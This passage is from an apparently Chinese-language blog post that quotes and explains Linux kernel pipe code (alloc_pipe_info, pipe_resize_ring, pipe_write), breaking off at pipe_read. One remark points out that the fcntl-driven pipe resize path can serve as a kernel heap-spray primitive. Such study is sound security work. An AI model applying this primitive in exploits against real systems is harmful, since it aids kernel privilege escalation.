class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">	pipe = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line">		pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	user_bufs = account_pipe_buffers(user, <span class="number">0</span>, pipe_bufs);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) {</span><br><span class="line">		user_bufs = account_pipe_buffers(user, pipe_bufs, <span class="number">1</span>);</span><br><span class="line">		pipe_bufs = <span class="number">1</span>;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())</span><br><span class="line">		<span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;bufs) {</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">		pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">		pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">		pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">		pipe-&gt;user = user;</span><br><span class="line">		mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line">		<span class="keyword">return</span> pipe;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">	(<span class="type">void</span>) account_pipe_buffers(user, pipe_bufs, <span class="number">0</span>);</span><br><span class="line">	kfree(pipe);</span><br><span class="line">out_free_uid:</span><br><span class="line">	free_uid(user);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<p>pipe_buffer的分配是一次性分配PIPE_DEF_BUFFERS(16)个.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *	@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *	@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *	@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *	@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> {</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<p>但可以通过以下调用链重新设置pipe缓冲区的总大小并alloc and copy,即pipe_buffer的数量.堆喷手段get.</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pipe_fcntl</span><br><span class="line"> -&gt;pipe_set_size</span><br><span class="line">  -&gt;pipe_resize_ring</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Resize the pipe ring to a number of slots.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe_resize_ring</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">int</span> nr_slots)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We can shrink the pipe, if arg is greater than the ring occupancy.</span></span><br><span class="line"><span class="comment">	 * Since we don't expect a lot of shrink+grow operations, just free and</span></span><br><span class="line"><span class="comment">	 * allocate again like we would do for growing.  If the pipe currently</span></span><br><span class="line"><span class="comment">	 * contains more buffers than arg, then return busy.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">	head = pipe-&gt;head;</span><br><span class="line">	tail = pipe-&gt;tail;</span><br><span class="line">	n = pipe_occupancy(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">	<span class="keyword">if</span> (nr_slots &lt; n)</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line">	bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">		       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!bufs))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The pipe array wraps around, so just start the new one at zero</span></span><br><span class="line"><span class="comment">	 * and adjust the indices.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt; <span class="number">0</span>) {</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> h = head &amp; mask;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> t = tail &amp; mask;</span><br><span class="line">		<span class="keyword">if</span> (h &gt; t) {</span><br><span class="line">			<span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,</span><br><span class="line">			       n * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">		} <span class="keyword">else</span> {</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> tsize = pipe-&gt;ring_size - t;</span><br><span class="line">			<span class="keyword">if</span> (h &gt; <span class="number">0</span>)</span><br><span class="line">				<span class="built_in">memcpy</span>(bufs + tsize, pipe-&gt;bufs,</span><br><span class="line">				       h * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">			<span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,</span><br><span class="line">			       tsize * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	head = n;</span><br><span class="line">	tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">	pipe-&gt;bufs = bufs;</span><br><span class="line">	pipe-&gt;ring_size = nr_slots;</span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;max_usage &gt; nr_slots)</span><br><span class="line">		pipe-&gt;max_usage = nr_slots;</span><br><span class="line">	pipe-&gt;tail = tail;</span><br><span class="line">	pipe-&gt;head = head;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This might have made more room for writers */</span></span><br><span class="line">	wake_up_interruptible(&amp;pipe-&gt;wr_wait);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>


<h2 id="pipe-write"><a href="#pipe-write" class="headerlink" title="pipe_write"></a>pipe_write</h2><p>比较长,分段分析.<br>用户数据是通过io向量来存的</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iov_iter</span> {</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Bit 0 is the read/write bit, set if we're writing.</span></span><br><span class="line"><span class="comment">	 * Bit 1 is the BVEC_FLAG_NO_REF bit, set if type is a bvec and</span></span><br><span class="line"><span class="comment">	 * the caller isn't expecting to drop a page reference when done.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> type;</span><br><span class="line">	<span class="type">size_t</span> iov_offset;</span><br><span class="line">	<span class="type">size_t</span> count;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> {</span></span><br><span class="line">		<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">iov</span>;</span></span><br><span class="line">		<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kvec</span> *<span class="title">kvec</span>;</span></span><br><span class="line">		<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span> *<span class="title">bvec</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	};</span><br><span class="line">	<span class="class"><span class="keyword">union</span> {</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> nr_segs;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> start_head;</span><br><span class="line">		};</span><br><span class="line">	};</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>

<p>如果该pipe没有读者 (!pipe-&gt;readers)直接返回-EPIPE.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">	<span class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="type">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line">	<span class="type">ssize_t</span> chars;</span><br><span class="line">	<span class="type">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Null write succeeds. */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pipe-&gt;readers) {</span><br><span class="line">		send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">		ret = -EPIPE;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;watch_queue) {</span><br><span class="line">		ret = -EXDEV;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	}</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>注意这里的读者不是说read阻塞在该pipe上的任务数,而是以可读方式打开了该管道的计数,对于匿名管道来说readers和writers都为1.而对于有名管道fifo,则是通过fifo_open时的读写方式来增加计数.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> inode * <span class="title function_">get_pipe_inode</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">...</span><br><span class="line">pipe-&gt;readers = pipe-&gt;writers = <span class="number">1</span>;</span><br><span class="line">...</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>


<p>如果当前pipe不为空(head!=tail),则尝试先将部分数据写入上次使用的buffer,注意这里需要该buffer有PIPE_BUF_FLAG_CAN_MERGE的标志.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If it wasn't empty we try to merge new data into</span></span><br><span class="line"><span class="comment"> * the last buffer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * That naturally merges small writes, but it also</span></span><br><span class="line"><span class="comment"> * page-aligs the rest of the writes for large writes</span></span><br><span class="line"><span class="comment"> * spanning multiple pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) {</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">	<span class="type">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">	    offset + chars &lt;= PAGE_SIZE) {</span><br><span class="line">		ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">		ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(ret &lt; chars)) {</span><br><span class="line">			ret = -EFAULT;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		buf-&gt;len += ret;</span><br><span class="line">		<span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>


<p>然后是正式的大循环写入<br>每轮循环:</p>
<ul>
<li>如果!pipe-&gt;readers则返回-EPIPE;</li>
<li>为本次写入获取一张临时页面(pipe-&gt;tmp_pages),可能分配也可能使用上次失败留下或刚消耗完的.</li>
<li>插入到当前buffer-&gt;page中并拷贝用户数据.</li>
<li>如果pipe满了,直接返回(O_NONBLOCK)或唤醒rd_wait并加入wr_wait等待数据被消耗.<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) {</span><br><span class="line">		<span class="keyword">if</span> (!pipe-&gt;readers) {</span><br><span class="line">			send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span> (!ret)</span><br><span class="line">				ret = -EPIPE;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		head = pipe-&gt;head;</span><br><span class="line">		<span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) {</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line">			<span class="type">int</span> copied;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!page) {</span><br><span class="line">				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line">				<span class="keyword">if</span> (unlikely(!page)) {</span><br><span class="line">					ret = ret ? : -ENOMEM;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				}</span><br><span class="line">				pipe-&gt;tmp_page = page;</span><br><span class="line">			}</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* Allocate a slot in the ring in advance and attach an</span></span><br><span class="line"><span class="comment">			 * empty buffer.  If we fault or otherwise fail to use</span></span><br><span class="line"><span class="comment">			 * it, either the reader will consume it or it'll still</span></span><br><span class="line"><span class="comment">			 * be there for the next write.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">			head = pipe-&gt;head;</span><br><span class="line">			<span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) {</span><br><span class="line">				spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			}</span><br><span class="line"></span><br><span class="line">			pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">			spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">			buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			buf-&gt;page = page;</span><br><span class="line">			buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">			pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">			copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);</span><br><span class="line">			<span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) {</span><br><span class="line">				<span class="keyword">if</span> (!ret)</span><br><span class="line">					ret = -EFAULT;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			}</span><br><span class="line">			ret += copied;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Wait for buffer space to become available. */</span></span><br><span class="line">		<span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) {</span><br><span class="line">			<span class="keyword">if</span> (!ret)</span><br><span class="line">				ret = -EAGAIN;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) {</span><br><span class="line">			<span class="keyword">if</span> (!ret)</span><br><span class="line">				ret = -ERESTARTSYS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We're going to release the pipe lock and wait for more</span></span><br><span class="line"><span class="comment">		 * space. We wake up any readers if necessary, and then</span></span><br><span class="line"><span class="comment">		 * after waiting we need to re-check whether the pipe</span></span><br><span class="line"><span class="comment">		 * become empty while we dropped the lock.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		__pipe_unlock(pipe);</span><br><span class="line">		<span class="keyword">if</span> (was_empty) {</span><br><span class="line">			wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">			kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">		}</span><br><span class="line">		wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));</span><br><span class="line">		__pipe_lock(pipe);</span><br><span class="line">		was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">		wake_next_writer = <span class="literal">true</span>;</span><br><span class="line">	}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h2 id="pipe-read"><a href="#pipe-read" class="headerlink" title="pipe_read"></a>pipe_read</h2><p>还是大循环的形式.将buf-&gt;page拷贝到io向量中后,若该page没有其他引用,将其作为pipe-&gt;tmp_page或直接释放.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 